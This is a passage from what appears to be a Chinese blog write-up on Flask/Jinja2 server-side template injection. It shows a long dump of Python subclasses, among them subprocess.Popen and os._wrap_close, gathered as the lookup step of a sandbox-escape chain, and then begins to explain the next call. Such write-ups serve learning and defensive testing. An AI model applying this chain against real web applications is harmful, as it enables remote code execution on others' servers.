&#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.Pattern&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;Struct&#x27;&gt;, &lt;class &#x27;unpack_iterator&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;_sha3.sha3_224&#x27;&gt;, &lt;class &#x27;_sha3.sha3_256&#x27;&gt;, &lt;class &#x27;_sha3.sha3_384&#x27;&gt;, &lt;class &#x27;_sha3.sha3_512&#x27;&gt;, &lt;class &#x27;_sha3.shake_128&#x27;&gt;, &lt;class &#x27;_sha3.shake_256&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContextBase&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContextIterator&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._Waiter&#x27;&gt;, &lt;class &#x27;concurrent.futures._base._AcquireFutures&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Future&#x27;&gt;, &lt;class &#x27;concurrent.futures._base.Executor&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;asyncio.coroutines.CoroWrapper&#x27;&gt;, &lt;class &#x27;asyncio.events.Handle&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractServer&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoop&#x27;&gt;, &lt;class &#x27;asyncio.events.AbstractEventLoopPolicy&#x27;&gt;, &lt;class &#x27;_asyncio.Future&#x27;&gt;, &lt;class &#x27;_asyncio.FutureIter&#x27;&gt;, &lt;class &#x27;TaskStepMethWrapper&#x27;&gt;, &lt;class &#x27;TaskWakeupMethWrapper&#x27;&gt;, &lt;class &#x27;_RunningLoopHolder&#x27;&gt;, &lt;class &#x27;asyncio.futures.Future&#x27;&gt;, &lt;class &#x27;asyncio.protocols.BaseProtocol&#x27;&gt;, &lt;class &#x27;asyncio.transports.BaseTransport&#x27;&gt;, &lt;class &#x27;asyncio.sslproto._SSLPipe&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManager&#x27;&gt;, &lt;class &#x27;asyncio.locks._ContextManagerMixin&#x27;&gt;, &lt;class &#x27;asyncio.locks.Event&#x27;&gt;, &lt;class &#x27;asyncio.queues.Queue&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamWriter&#x27;&gt;, &lt;class &#x27;asyncio.streams.StreamReader&#x27;&gt;, &lt;class &#x27;asyncio.subprocess.Process&#x27;&gt;, &lt;class &#x27;asyncio.unix_events.AbstractChildWatcher&#x27;&gt;, &lt;class &#x27;jinja2.asyncsupport.AsyncLoopContextIterator&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ViewItems&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.middleware.dispatcher.DispatcherMiddleware&#x27;&gt;, &lt;class &#x27;werkzeug.middleware.http_proxy.ProxyMiddleware&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.middleware.shared_data.SharedDataMiddleware&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;&gt;, &lt;class &#x27;flask._compat._DeprecatedBool&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;, &lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json._JSONModule&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;wtforms.validators.EqualTo&#x27;&gt;, &lt;class &#x27;wtforms.validators.Length&#x27;&gt;, &lt;class &#x27;wtforms.validators.NumberRange&#x27;&gt;, &lt;class &#x27;wtforms.validators.Optional&#x27;&gt;, &lt;class &#x27;wtforms.validators.DataRequired&#x27;&gt;, &lt;class &#x27;wtforms.validators.InputRequired&#x27;&gt;, &lt;class &#x27;wtforms.validators.Regexp&#x27;&gt;, &lt;class &#x27;wtforms.validators.Email&#x27;&gt;, &lt;class &#x27;wtforms.validators.IPAddress&#x27;&gt;, &lt;class &#x27;wtforms.validators.UUID&#x27;&gt;, &lt;class &#x27;wtforms.validators.AnyOf&#x27;&gt;, &lt;class &#x27;wtforms.validators.NoneOf&#x27;&gt;, &lt;class &#x27;wtforms.validators.HostnameValidation&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.ListWidget&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.TableWidget&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.Input&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.TextArea&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.Select&#x27;&gt;, &lt;class &#x27;wtforms.widgets.core.Option&#x27;&gt;, &lt;class &#x27;wtforms.i18n.DefaultTranslations&#x27;&gt;, &lt;class &#x27;wtforms.i18n.DummyTranslations&#x27;&gt;, &lt;class &#x27;wtforms.utils.UnsetValue&#x27;&gt;, &lt;class &#x27;wtforms.utils.WebobInputWrapper&#x27;&gt;, &lt;class &#x27;wtforms.fields.core.Field&#x27;&gt;, &lt;class &#x27;wtforms.fields.core.UnboundField&#x27;&gt;, &lt;class &#x27;wtforms.fields.core.Flags&#x27;&gt;, &lt;class &#x27;wtforms.fields.core.Label&#x27;&gt;, &lt;class &#x27;wtforms.meta.DefaultMeta&#x27;&gt;, &lt;class &#x27;wtforms.form.BaseForm&#x27;&gt;, &lt;class &#x27;wtforms.csrf.core.CSRF&#x27;&gt;, &lt;class &#x27;flask_wtf.csrf.CSRFProtect&#x27;&gt;, &lt;class &#x27;flask_wtf.recaptcha.widgets.RecaptchaWidget&#x27;&gt;, &lt;class &#x27;flask_wtf.recaptcha.validators.Recaptcha&#x27;&gt;, &lt;class &#x27;dominate.dom_tag.dom_tag&#x27;&gt;, &lt;class &#x27;dominate.dom1core.dom1core&#x27;&gt;, &lt;class &#x27;visitor.Visitor&#x27;&gt;, &lt;class &#x27;flask_bootstrap.CDN&#x27;&gt;, &lt;class &#x27;flask_bootstrap.StaticCDN&#x27;&gt;, &lt;class &#x27;flask_bootstrap.WebCDN&#x27;&gt;, &lt;class &#x27;flask_bootstrap.ConditionalCDN&#x27;&gt;, &lt;class &#x27;flask_bootstrap.Bootstrap&#x27;&gt;, &lt;class &#x27;jinja2.ext.Extension&#x27;&gt;, &lt;class &#x27;jinja2.ext._CommentFinder&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug.serving._SSLContext&#x27;&gt;, &lt;class &#x27;werkzeug.serving.BaseWSGIServer&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.Line&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.Traceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.Group&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.Frame&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;jinja2.debug.TracebackFrameProxy&#x27;&gt;, &lt;class &#x27;jinja2.debug.ProcessedTraceback&#x27;&gt;, &lt;class &#x27;CArgObject&#x27;&gt;, &lt;class &#x27;_ctypes.CThunkObject&#x27;&gt;, &lt;class &#x27;_ctypes._CData&#x27;&gt;, &lt;class &#x27;_ctypes.CField&#x27;&gt;, &lt;class &#x27;_ctypes.DictRemover&#x27;&gt;, &lt;class &#x27;ctypes.CDLL&#x27;&gt;, &lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;]\n&quot;</span>]</span><br><span class="line"></span><br><span class="line">进程已结束,退出代码<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用内置类，查出来是并发锁类，再调用初始化方法：</p>
